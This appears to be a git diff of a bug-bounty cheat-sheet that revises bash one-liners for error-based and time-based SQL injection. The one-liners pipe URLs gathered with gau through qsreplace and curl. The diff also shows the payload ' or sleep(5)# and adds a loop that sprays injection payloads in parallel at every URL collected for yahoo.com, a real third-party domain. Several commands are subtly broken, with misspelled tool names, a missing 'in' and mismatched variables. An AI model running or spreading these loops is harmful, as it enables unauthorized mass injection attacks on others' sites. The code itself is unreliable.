@@ -16,7 +16,7 @@ gau -subs testphp.vulnweb.com | grep "=" | httpx -silent | qsreplace "1'" | xarg
 for sqli $(cat sqliyaload.txt) ;do for url in $(gau -subs targets.txt | grep "=" | gf sqli | httpx | qsrepalce "$sqli") ;do echo "$url" | xargs -I{} sh -c 'curl -sk "{}" 2>&1 | grep -q "mysql_fetch_array" && echo "Error based SQLI {}"' ;done 
 
 
-T**ime based:**
+**Time based:**
 payload used: ' or sleep(5)#
 
 Normal testing:
@@ -25,7 +25,7 @@ time curl -s -I "http://testphp.vulnweb.com/artists.php?artist=1 or sleep(10)#"
  
  
 **Automation:**
-for sqli $(cat sqlitime.txt) ;do for url in $(gau -subs targets.txt | grep "=" | gf sqli | httpx ) ;do echo "$url" | xargs -I{} "time  curl -sk "{}" ; echo "$url" | qsreplace "$sqlitime"| xargs -I sh -c time curl -sk "{}"  | grep -q "real" ;done ;done 
+for sqli in $(cat sqlitime.txt) ;do for url in $(gau -subs yahoo.com) ;do  echo "$url" | qsreplace "$sqli"| parallel -j 10 'time curl -s -I "%"' ;print "timebase sqli without payload" ;echo "$url" | parallel -j 10 'time curl -s -I "%"' ;done ;done
 
 
 **LFI:**
